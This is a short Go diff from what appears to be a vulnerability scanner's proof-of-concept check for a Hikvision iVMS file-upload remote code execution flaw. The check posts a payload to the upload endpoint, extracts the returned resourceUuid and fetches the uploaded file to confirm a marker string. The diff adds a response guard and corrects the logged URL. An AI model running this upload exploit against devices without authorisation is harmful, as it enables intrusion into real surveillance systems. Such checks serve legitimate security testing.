@@ -19,14 +19,14 @@ func Hikvision_iVMS_files_rce(u string) bool {
 
 	if req, err := pkg.HttpRequset(u+"/eps/api/resourceOperations/upload?token="+md5, "POST", payload, false, header); err == nil {
 		//pkg.GoPocLog(req.Body)
-		if req.StatusCode == 200 {
-			rbody := req.Body
+
+		if req.StatusCode == 200 && strings.Contains(req.Body, "resourceUuid") {
 			var pattern = `"resourceUuid":"([^"]*)"`
 			re := regexp.MustCompile(pattern)
-			resourceUuid := re.FindStringSubmatch(rbody)[1]
+			resourceUuid := re.FindStringSubmatch(req.Body)[1]
 			if req2, err := pkg.HttpRequset(u+"/eps/upload/"+resourceUuid+".txt", "GET", "", false, nil); err == nil {
 				if req2.StatusCode == 200 && strings.Contains(req2.Body, "mBoundaryGEJwiloiPo") {
-					pkg.GoPocLog(fmt.Sprintf("Found vuln Hikvision_iVMS_files_rce!!!|%s\n", u+"/eps/upload/"+resourceUuid))
+					pkg.GoPocLog(fmt.Sprintf("Found vuln Hikvision_iVMS_files_rce!!!|%s\n", u+"/eps/upload/"+resourceUuid+".txt"))
 					return true
 				}
 			}
